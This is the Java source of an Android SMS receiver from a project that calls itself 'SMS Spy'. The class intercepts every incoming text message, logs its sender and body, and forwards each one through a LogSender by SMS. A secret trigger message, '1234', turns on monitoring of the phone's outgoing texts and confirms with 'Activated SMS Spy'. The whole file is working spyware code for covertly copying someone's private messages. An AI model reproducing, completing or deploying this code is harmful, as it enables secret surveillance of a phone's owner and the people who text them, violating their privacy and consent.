package com.AmygdalaSoftware;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceivedListener extends BroadcastReceiver {

	@Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs = null;
            String msgFrom;
            if (bundle != null){
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i = 0; i < msgs.length; i++){
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        msgFrom = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        Log.d(SmsReceivedListener.class.getName(), "Received message from: " + msgFrom + " " + msgBody);
                        if(msgBody.equals("1234")) {
                        	Log.d(SmsReceivedListener.class.getName(), "Received activation request");
                        	SmsSentObserver smsSentObserver = new SmsSentObserver(new Handler(), context);
                        	context.getContentResolver().registerContentObserver(SmsSentObserver.STATUS_URI, true, smsSentObserver);
                        	LogSender.getInstance(context).sendSms("Activated SMS Spy");
                        } else {
                        	Log.d(SmsReceivedListener.class.getName(), "Received text message");
                        	LogSender.getInstance(context).sendSms("From:" + msgFrom + ". Message: " + msgBody);
                        }
                    }
                } catch (Exception e){
                	Log.d("Exception caught",e.getMessage());
                }
            }
        }
    }
}
